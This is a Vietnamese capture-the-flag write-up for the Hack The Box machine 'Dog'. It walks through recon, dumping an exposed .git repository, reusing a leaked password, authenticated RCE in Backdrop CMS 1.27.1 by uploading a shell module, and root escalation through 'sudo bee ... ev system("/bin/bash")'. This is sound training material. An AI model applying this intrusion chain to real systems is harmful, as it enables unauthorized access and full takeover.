![image](https://hackmd.io/_uploads/B1t6LYCjyx.png)

# Machine info and Comment
## Machine info
Đây là một máy đang active nên chưa có thông tin về máy này [Link]

## Comment
Thêm một máy tận dụng tính năng vốn có của tool để leo quyền

# Recon
## nmap
Từ việc sử dụng nmap ta sẽ phát hiện được server đã để lộ path `.git`
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -n -sS 10.10.11.58
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-11 23:57 EDT
Nmap scan report for 10.10.11.58
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 16.33 seconds
                                                                           
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p22,80 -sCV 10.10.11.58
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-11 23:58 EDT
Nmap scan report for dog.htb (10.10.11.58)
Host is up (0.20s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Home | Dog
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.28 seconds
```
Add domain vào `/etc/hosts`
```
echo "10.10.11.58 dog.htb" | sudo tee -a /etc/hosts
```
## git-dumper
```
┌──(kali㉿kali)-[~/git-dumper]
└─$ python3 git_dumper.py http://dog.htb/.git/ ~/website
```
### setting.php
Ngay khi dump ra, ở `setting.php` ta sẽ thấy một vài thông tin như credential để root login vào mysql. `root:root:BackDropJ2024DS2024`

![image](https://hackmd.io/_uploads/SkvZdtAs1l.png)

# User flag
## Overview
Tổng quan trang web chỉ có chức năng login, reset password và cms được sử dụng là Backdrop. Từ đây có một vài attack surface là khai thác ở form login hoặc tìm ra phiên bản của cms này xem có lỗ hổng được phát hiện hay không.

![image](https://hackmd.io/_uploads/Bk52dYCsJg.png)

### robots.txt
File này cũng cho ta thêm một số thông tin như có các trường để inject như comment, filter, add. Đây là nơi mở rộng thêm attack-surface nhưng quan trọng là phải có credential

![image](https://hackmd.io/_uploads/ByTrtKCsJg.png)

Từ trên thì khả năng credential có thể bị lộ và tìm trong quá trình dump `.git`

## Information disclosure
### grep
grep tìm credential
```
┌──(kali㉿kali)-[~/website]
└─$ grep -r "@dog" .
```

![image](https://hackmd.io/_uploads/HyPMoKRokx.png)

Tìm được username là `tiffany` nhưng mật khẩu chưa có, ta sẽ thử với mật khẩu tìm thấy ở [setting.php](#settingphp)

![image](https://hackmd.io/_uploads/BkmE6tRoJg.png)

Lý do login vào được dashboard có thể là do như ảnh trên `/admin/dashboard` là một path chỉ dành cho admin và user này là một người trong nhóm root. `tiffany:BackDropJ2024DS2024`

Tiếp tục grep tìm version cms, kết quả ở dưới, dựa vào path grep đoạn code tìm được, truy cập vào để xem thêm thông tin có thể có

```
┌──(kali㉿kali)-[~/website]
└─$ grep -r "backdrop_version" .
```

![image](https://hackmd.io/_uploads/HknhjY0o1g.png)

Việc trace vào đã có kết quả khi version của cms này là `1.27.1`

![image](https://hackmd.io/_uploads/ryaMnt0s1g.png)

## Backdrop CMS 1.27.1 - Authenticated RCE
Backdrop CMS ver 1.27.1 tồn tại lỗ hổng file upload to RCE. POC đã có ở [exploit-db](https://www.exploit-db.com/exploits/52021)

![image](https://hackmd.io/_uploads/r1ZegnRskl.png)

Sau khi gen file zip ta sẽ uplpad ở `/admin/modules/install`

![image](https://hackmd.io/_uploads/HyDIxnCs1e.png)

![image](https://hackmd.io/_uploads/r1ztxnCjyl.png)

Xem và chạy file tại `modules/shell/shell.php`

![image](https://hackmd.io/_uploads/HyJ3bhRj1x.png)

Dựng phiên nghe tại máy tấn công

![image](https://hackmd.io/_uploads/rJZpW2Aokl.png)

RCE thành công, user hiện tại sẽ là `www-data` và ta cần nhảy sang user khác để lấy user flag

![image](https://hackmd.io/_uploads/SyoWQhCo1l.png)

## Lateral Movement
Dùng ssh sang user `johncusack` cho đỡ mất phiên và lag `johncusack:BackDropJ2024DS2024`

:::spoiler User flag
```
johncusack@dog:~$ cat user.txt 
0d5223f5308cdd44fa1459771f51c054
```
:::

# Root flag
## sudo -l 
```
johncusack@dog:~$ sudo -l 
[sudo] password for johncusack: 
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```
> bee là một công cụ dòng lệnh cho Backdrop CMS. Nó bao gồm các lệnh cho phép dev tương tác với các trang Backdrop, thực hiện các hành động như: Chạy cron, Xóa bộ nhớ cache, Tải xuống và cài đặt Backdrop, Quản lý các module và dự án Backdrop

![image](https://hackmd.io/_uploads/r1z2XnCs1x.png)

Việc lợi dụng các tính năng có sẵn của những công cụ này luôn là miếng mồi béo bở : )

`--root`: sẽ xác định webroot nơi chứa cms Backdrop, do đó ta phải chỉ định lại vị trí về webroot (`/var/www/html`) 

![image](https://hackmd.io/_uploads/HkTT7hRsJe.png)

`eval`: option này được attacker lợi dụng để thực thi mã PHP tùy ý.

![image](https://hackmd.io/_uploads/r1-kEnRjyl.png)

Command hoàn chỉnh để leo quyền thành công:

```
johncusack@dog:~$ sudo bee --root='/var/www/html' ev 'system("/bin/bash");'
root@dog:/var/www/html# 
```

:::spoiler Root flag
```
root@dog:/var/www/html# cat /root/root.txt
517a8554dfb4ee816f25********
```
:::

------------------------------------------ Dog has been Pwned! ------------------------------------------

![image](https://hackmd.io/_uploads/S1lxrhCjJl.png)
